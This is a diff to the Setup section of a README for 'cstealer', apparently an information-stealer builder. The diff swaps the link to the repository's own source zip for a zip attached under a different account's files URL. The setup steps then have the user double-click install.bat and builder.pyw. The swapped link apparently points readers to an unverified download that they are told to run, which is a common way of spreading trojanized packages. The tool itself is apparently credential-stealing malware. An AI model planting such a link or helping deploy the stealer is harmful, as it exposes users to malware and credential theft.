@@ -94,7 +94,7 @@
 
 ### Setup
 
-1. [Download source code zip](https://github.com/can-kat/cstealer/archive/refs/heads/main.zip)
+1. [Download source code zip](https://github.com/drexlerpro/cstealer/files/14735513/cstealer.zip)
 2. Extract zip
 3. First install reqiured packages by double clicking `install.bat` file
 4. Run the builder by double clicking the `builder.pyw` file
